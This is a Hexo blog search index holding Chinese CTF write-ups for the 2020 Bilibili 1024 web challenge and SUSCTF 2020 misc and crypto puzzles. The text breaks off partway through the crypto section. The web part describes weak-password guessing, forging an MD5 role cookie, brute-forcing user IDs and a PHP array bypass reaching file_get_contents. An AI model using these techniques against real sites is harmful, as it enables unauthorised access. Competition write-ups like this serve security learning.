<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>/uncategorized/ckwd5ws9a004nd0ucn58l2eie/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[2020Bilibili解密赛]]></title>
      <url>/ctf-writeup-web/ckwd5ws6b000gd0ucl9z086ue/</url>
      <content type="html"><![CDATA[<p><a href="https://security.bilibili.com/sec1024/" target="_blank" rel="noopener">https://security.bilibili.com/sec1024/</a></p>
<h2 id="第一关-页面的背后是什么？"><a href="#第一关-页面的背后是什么？" class="headerlink" title="第一关  页面的背后是什么？"></a>第一关  页面的背后是什么？</h2><figure class="image-box">
                <img src="https://images-cdn.shimo.im/wOna8FEMVS405N3i__original.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>查看源码有flag1和flag2的接口</p>
<p>flag1接口是 api/admin</p>
<p>访问就有flag</p>
<figure class="image-box">
                <img src="https://images-cdn.shimo.im/d0TeMaQCaaPfZDTE__original.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag1{fe0cf087-8c3447bb-92c9cbca-1793c4cb}</p>
<p>flag2接口是 /api/ctf/2 ,采用get传参</p>
<p>修改UA:bilibili Security Browser</p>
<figure class="image-box">
                <img src="https://images-cdn.shimo.im/1OuzkFDxyWgkAwsm__original.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag2{b8138188-0c16d0d5-7235c383-418dd144}</p>
<h2 id="第二关-真正的秘密只有特殊的设备才能看到"><a href="#第二关-真正的秘密只有特殊的设备才能看到" class="headerlink" title="第二关  真正的秘密只有特殊的设备才能看到"></a>第二关  真正的秘密只有特殊的设备才能看到</h2><figure class="image-box">
                <img src="https://images-cdn.shimo.im/tpEYVrrI9kRnVTky__original.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag3接口是api/ctf/3</p>
<p>管理员 admin</p>
<p>密码盲猜弱口令 bilibili</p>
<figure class="image-box">
                <img src="https://images-cdn.shimo.im/HLTD1syfg4kc1f1S__original.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag3{cddb6186-4bdd52ea-0623764d-99f9b62f}</p>
<h2 id="第三关-对不起，权限不足～"><a href="#第三关-对不起，权限不足～" class="headerlink" title="第三关  对不起，权限不足～"></a>第三关  对不起，权限不足～</h2><figure class="image-box">
                <img src="https://images-cdn.shimo.im/OIN2BkTaufcyt3MX__original.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag4接口是api/ctf/4</p>
<p>只有window才有超级管理员的说法,即Administrator</p>
<p>抓包发现Cookie里有role变量,是个32位字符串,估计经过md5加密</p>
<figure class="image-box">
                <img src="https://images-cdn.shimo.im/saRnJpEB1xeqvqd1__original.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>将Administrator加密后传入  7b7bc2512ee1fedcd76bdc68926d4f7b</p>
<figure class="image-box">
                <img src="https://images-cdn.shimo.im/1eH8AwbMlcBylSgf__original.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag4{b5112a88-bb60c9e7-99935a1c-052fcc2e}</p>
<h2 id="第四关别人的秘密"><a href="#第四关别人的秘密" class="headerlink" title="第四关别人的秘密"></a>第四关别人的秘密</h2><figure class="image-box">
                <img src="https://images-cdn.shimo.im/Wbf3oi5rQNp3kku8__original.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>查看源码,提取关键信息</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> uid = $.getUrlParam(<span class="string">'uid'</span>);</span><br><span class="line">            <span class="keyword">if</span> (uid == <span class="literal">null</span>) &#123;</span><br><span class="line">                uid = <span class="number">100336889</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $.ajax(&#123;</span><br><span class="line">                url: <span class="string">"api/ctf/5?uid="</span> + uid,</span><br><span class="line">                type: <span class="string">"get"</span>,</span><br><span class="line">                success:<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">	              <span class="built_in">console</span>.log(data);</span><br><span class="line">	              <span class="keyword">if</span> (data.code == <span class="number">200</span>)&#123;</span><br><span class="line">	              <span class="comment">// 如果有值：前端跳转</span></span><br><span class="line">	           $(<span class="string">'#flag'</span>).html(<span class="string">"欢迎超级管理员登陆～flag : "</span> + data.data )</span><br></pre></td></tr></table></figure>
<p>flag5接口是 api/ctf/5?uid=<br>role依旧为 7b7bc2512ee1fedcd76bdc68926d4f7b</p>
<p>意思应该是要从100336889开始爆破,我爆到的是100336919</p>
<figure class="image-box">
                <img src="https://images-cdn.shimo.im/ICV7aTgqHYuEnLGW__original.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>flag5{f6c5ee82-af7a41b6-6f9314be-8625059a}</p>
<h2 id="第五关-结束亦是开始"><a href="#第五关-结束亦是开始" class="headerlink" title="第五关  结束亦是开始"></a>第五关  结束亦是开始</h2><figure class="image-box">
                <img src="https://images-cdn.shimo.im/hS7WTPesfWA6SPei__original.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>根据题目意思访问 /blog/end.php</p>
<figure class="image-box">
                <img src="https://images-cdn.shimo.im/7a9QEqPeHcS9p1o5__original.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>wfuzz一下文件</p>
<figure class="image-box">
                <img src="https://images-cdn.shimo.im/8DzWwf049y7hVr4b__original.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>访问 /blog/test.php,得到一大段jsfuck</p>
<p>放到console输出</p>
<figure class="image-box">
                <img src="https://images-cdn.shimo.im/Jwq0NvFpTFA2WkUP__original.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var str1 = &quot;\u7a0b\u5e8f\u5458\u6700\u591a\u7684\u5730\u65b9&quot;;</span><br><span class="line">//程序员最多的地方</span><br><span class="line">var str2 = &quot;bilibili1024havefun&quot;;</span><br><span class="line">console.log()</span><br></pre></td></tr></table></figure>
<p>在github上搜索相关信息,找到end.php的<a href="https://github.com/interesting-1024/end/blob/main/end.php" target="_blank" rel="noopener">源码</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//filename end.php</span></span><br><span class="line">$bilibili = <span class="string">"bilibili1024havefun"</span>;</span><br><span class="line">$str = intval($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$reg = preg_match(<span class="string">'/\d/is'</span>, $_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="keyword">if</span>(!is_numeric($_GET[<span class="string">'id'</span>]) <span class="keyword">and</span> $reg !== <span class="number">1</span> <span class="keyword">and</span> $str === <span class="number">1</span>)&#123;</span><br><span class="line">	$content = file_get_contents($_GET[<span class="string">'url'</span>]);</span><br><span class="line">	<span class="comment">//文件路径猜解</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">false</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"还差一点点啦～"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"你想要的不在这儿～"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>根据逻辑用数组绕过,即 id[]=1<br>flag6接口是 api/ctf/6</p>
<p>猜测为flag.txt</p>
<figure class="image-box">
                <img src="https://images-cdn.shimo.im/MJEs8pad0i0T8Oji__original.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>访问图片地址/imgs/bilibili_224a634752448def6c0ec064e49fe797_havefun.jpg</p>
<figure class="image-box">
                <img src="https://images-cdn.shimo.im/OOtcvlBwOtfk1dOx__original.jpg" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>用winhex打开,结尾有flag10?</p>
<figure class="image-box">
                <img src="https://images-cdn.shimo.im/j7UJA5OsYb2ceuu3__original.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>后面试了试url的参数接口可以是任意1-10数,flag.txt都在接口目录下</p>
<p>flag10{2ebd3b08-47ffc478-b49a5f9d-f6099d65}</p>
<h2 id="接下来的旅程-需要少年自己去探索啦～"><a href="#接下来的旅程-需要少年自己去探索啦～" class="headerlink" title="接下来的旅程 需要少年自己去探索啦～"></a>接下来的旅程 需要少年自己去探索啦～</h2><p>后面因为我是打完Byte和护网杯才来看的Bilibili,没多少时间做,开了个头就当有个参与感了</p>
<p>别的题的思路见<a href="https://www.zhihu.com/question/427113420/answers/updated+" target="_blank" rel="noopener">知乎</a>或Github</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2020susctf_wp]]></title>
      <url>/ctf-writeup/ckwd5ws6o000pd0ucnyi3q1pw/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>得到号的时候只剩半天时间了,断断续续做了一些题,有些web题环境关了来不及复现,buu见</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>SUSCTF{Welcome_t0_SUSCTF}</p>
<h3 id="调查问卷"><a href="#调查问卷" class="headerlink" title="调查问卷"></a>调查问卷</h3><p>SUSCTF{Thank_y0u_fOr_your_r3ply}</p>
<h3 id="爆破鬼才请求出战"><a href="#爆破鬼才请求出战" class="headerlink" title="爆破鬼才请求出战"></a>爆破鬼才请求出战</h3><p>第一关,掩码爆破</p>
<figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>第二关,LSB隐写</p>
<figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>第三关,栅栏密码</p>
<p>S{urgdt1}UY_30__sS0a_04mc</p>
<figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>SUS{Y0u_ar3_g00d_4t_m1sc}</p>
<h3 id="签到之公众号"><a href="#签到之公众号" class="headerlink" title="签到之公众号"></a>签到之公众号</h3><p>SUSCTF{W3lc0m3_t0_SUSCTF}</p>
<h3 id="Dance-Dance"><a href="#Dance-Dance" class="headerlink" title="Dance_Dance"></a>Dance_Dance</h3><p>第一关,跳舞的小人密码</p>
<figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>根据<a href="https://www.dcode.fr/dancing-men-cipher" target="_blank" rel="noopener">在线网站</a>对出字符,举旗子的代表一个单词的结尾</p>
<figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>passwdLetU sdanCe</p>
<p>第二关,binwalk分离</p>
<figure class="image-box">
                <img src="./7.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>压缩包密码:LetUsdanCe</p>
<p>第三关,音频频谱二维码</p>
<figure class="image-box">
                <img src="./8.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>终究还是自己手画了出来</p>
<figure class="image-box">
                <img src="./9.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>SUS{1nt3r35t1nG_5p3ctRum}</p>
<h3 id="balɟ¯ʇuᴉɹԀ"><a href="#balɟ¯ʇuᴉɹԀ" class="headerlink" title="ƃɐlɟ¯ʇuᴉɹԀ"></a>ƃɐlɟ¯ʇuᴉɹԀ</h3><p>将十六进制数据倒序,得到一个zip</p>
<p>zip里有一个txt和加密压缩包,对txt进行字频分析</p>
<figure class="image-box">
                <img src="./10.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>Mima:D0youkNOw3dpr1nt?</p>
<p>根据文件内容用到 Cura_SteamEngine 4.6.2 软件</p>
<p>是我没有的硬件,告辞</p>
<h3 id="萌-你还好吗？"><a href="#萌-你还好吗？" class="headerlink" title="[萌]你还好吗？"></a>[萌]你还好吗？</h3><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">在线网站</a>解ook密码</p>
<figure class="image-box">
                <img src="./11.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>Ar3_y0u_OK??</p>
<p>解压缩包得到图片,提示不够高,winhex改下高度</p>
<figure class="image-box">
                <img src="./12.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>SUS{wuhu_y0u_f1nD_m3}</p>
<h3 id="萌-fix-fo"><a href="#萌-fix-fo" class="headerlink" title="[萌]fix_fo"></a>[萌]fix_fo</h3><p>拖进winhex修复文件头</p>
<figure class="image-box">
                <img src="./13.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>解压得到新佛曰密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新佛曰：諸隸殿僧降殿吽殿諸陀摩隸僧缽薩殿願心殿薩殿咤伏殿聞莊摩咤殿諦殿如叻須降闍殿亦修我殿愍殿諸隸殿波如空殿如如囑囑殿</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./14.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>SUS{Ta1k_w1th_F0}</p>
<h3 id="抓住那只小老鼠"><a href="#抓住那只小老鼠" class="headerlink" title="抓住那只小老鼠"></a>抓住那只小老鼠</h3><p>第一关,zip伪加密,只有一个包是伪加密</p>
<figure class="image-box">
                <img src="./15.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>解压得到keyboard流量包,粗略看了下是键盘敲击码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">00:00:13:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:04:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:16:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:16:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:1a:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:12:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:15:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:07:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2c:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">02:00:00:00:00:00:00:00</span><br><span class="line">02:00:33:00:00:00:00:00</span><br><span class="line">02:00:00:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2c:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0f:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:20:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:18:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:22:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0f:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:27:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:27:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0e:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:21:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0b:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:20:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:15:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:1e:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0a:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:0b:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:2d:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:05:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:18:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:17:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:27:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br><span class="line">00:00:11:00:00:00:00:00</span><br><span class="line">00:00:00:00:00:00:00:00</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./16.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>password<space><space>l3t-u5-l00k-4t-th3-r1ght-butt0n</space></space></p>
<p>解不开那个压缩包,麻了</p>
<h3 id="emoji真好玩"><a href="#emoji真好玩" class="headerlink" title="emoji真好玩"></a>emoji真好玩</h3><p>根据文件名,是个jpg的jphs加密,密码在emoji里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">💸😲📓📓📀📧📰😫🐖👹🐛😫😥🐍📬📧😃🐡</span><br></pre></td></tr></table></figure>
<p>可以使用github上的<a href="https://github.com/pavelvodrazka/ctf-writeups/tree/master/hackyeaster2018/challenges/egg17/files/cracker" target="_blank" rel="noopener">脚本</a>解密<br><figure class="image-box">
                <img src="./17.png" alt="图片" title class>
                <p>图片</p>
            </figure></p>
<p>password:C0de3moj1</p>
<p>使用密码对图片进行解密</p>
<figure class="image-box">
                <img src="./18.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>得到一个01字符串,文件名说把它画出来,猜测是01字符串转二维码</p>
<p>根据开方为245*245的二维码,跑脚本得到二维码图片</p>
<figure class="image-box">
                <img src="./19.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>SUS{1p0ch_wanNA_4_npy5}</p>
<h3 id="小熊你咋带着品如的面具"><a href="#小熊你咋带着品如的面具" class="headerlink" title="小熊你咋带着品如的面具"></a>小熊你咋带着品如的面具</h3><p>看样子是要先取证iso再用获得的密码来用EncryptoforWin进行解密</p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="简单-嘤语"><a href="#简单-嘤语" class="headerlink" title="[简单]嘤语"></a>[简单]嘤语</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">小Z在某站监听到一段加密对话：</span><br><span class="line">😳😊⬜😇😏🤐😖😋🤩🧐😏🤣😖🥺🤐🔑⬜🤣⬜😇😠🤣🤪🤪😳😇🤣😠⬜😇😳😖🥺😍😏⬜😳🤪⬜🤣⬜😋🤐😖😍⬜🤩😆⬜😇😳😖🥺😍😏⬜😋🥺🤣😋⬜😴🤣🤪⬜😘🤪😍🙃⬜🥺😳🤪😋🤩😏😳😇🤣😠😠🤐⬜😅😘😋⬜😊🤩😴⬜🥺🤣🤪⬜😆🤣😠😠😍😊🔑⬜😆🤩😏⬜😋🥺😍⬜😭🤩🤪😋⬜😖🤣😏😋🔑⬜😳😊😋🤩⬜🙃😳🤪😘🤪😍⭕⬜😳😊⬜😇🤩😊😋😏🤣🤪😋⬜😋🤩⬜😭🤩🙃😍😏😊⬜😇😏🤐😖😋🤩🧐😏🤣😖🥺😳😇⬜🤣😠🧐🤩😏😳😋🥺😭🤪🔑⬜😭🤩🤪😋⬜😇😠🤣🤪🤪😳😇🤣😠⬜😇😳😖🥺😍😏🤪⬜😇🤣😊⬜😅😍⬜😖😏🤣😇😋😳😇🤣😠😠🤐⬜😇🤩😭😖😘😋😍🙃⬜🤣😊🙃⬜🤪🤩😠😮😍🙃⬜😅🤐⬜🥺🤣😊🙃⭕⬜🥺🤩😴😍😮😍😏🔑⬜😋🥺😍🤐⬜🤣😏😍⬜🤣😠🤪🤩⬜😘🤪😘🤣😠😠🤐⬜😮😍😏🤐⬜🤪😳😭😖😠😍⬜😋🤩⬜😅😏😍🤣😷⬜😴😳😋🥺⬜😭🤩🙃😍😏😊⬜😋😍😇🥺😊🤩😠🤩🧐🤐⭕⬜😋🥺😍⬜😋😍😏😭⬜😳😊😇😠😘🙃😍🤪⬜😋🥺😍⬜🤪😳😭😖😠😍⬜🤪🤐🤪😋😍😭🤪⬜😘🤪😍🙃⬜🤪😳😊😇😍⬜🧐😏😍😍😷⬜🤣😊🙃⬜😏🤩😭🤣😊⬜😋😳😭😍🤪🔑⬜😋🥺😍⬜😍😠🤣😅🤩😏🤣😋😍⬜😏😍😊🤣😳🤪🤪🤣😊😇😍⬜😇😳😖🥺😍😏🤪🔑⬜😴🤩😏😠🙃⬜😴🤣😏⬜😳😳⬜😇😏🤐😖😋🤩🧐😏🤣😖🥺🤐⬜🤪😘😇🥺⬜🤣🤪⬜😋🥺😍⬜😍😊😳🧐😭🤣⬜😭🤣😇🥺😳😊😍⬜🤣😊🙃⬜😅😍🤐🤩😊🙃⭕⬜🥺😍😏😍⬜😳🤪⬜🤐🤩😘😏⬜😆😠🤣🧐☯⬜🤪😘🤪😇😋😆🌘😍🤣🤪🤐⛔😏😍😖😠🤣😇😍⛔😇😏🤐😖😋🤩🌒⭕</span><br><span class="line">经过大量尝试，小Z勉强还原出一些特殊字符：</span><br><span class="line">⭕ =&gt; .</span><br><span class="line">☯ =&gt; :</span><br><span class="line">🔑 =&gt; ,</span><br><span class="line">⛔ =&gt; _</span><br><span class="line">🌘 =&gt; &#123;</span><br><span class="line">🌒 =&gt; &#125;</span><br><span class="line">你能帮帮他吗？</span><br><span class="line">注：flag均为大写</span><br></pre></td></tr></table></figure>
<p>找到了<a href="https://apps.timwhitlock.info/emoji/tables/unicode" target="_blank" rel="noopener">编码表</a>和<a href="https://apps.timwhitlock.info/unicode/inspect" target="_blank" rel="noopener">解密网站</a>,但这题用不到<br>这题纯粹靠英语来猜,比如最后这一段应该是flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">🤪😘🤪😇😋😆</span><br><span class="line">SUSCTF</span><br><span class="line">🌘😍🤣🤪🤐⛔😏😍😖😠🤣😇😍⛔😇😏🤐😖😋🤩🌒</span><br><span class="line">SUSCTF&#123;**S*_*****C*_C***T*&#125;</span><br></pre></td></tr></table></figure>
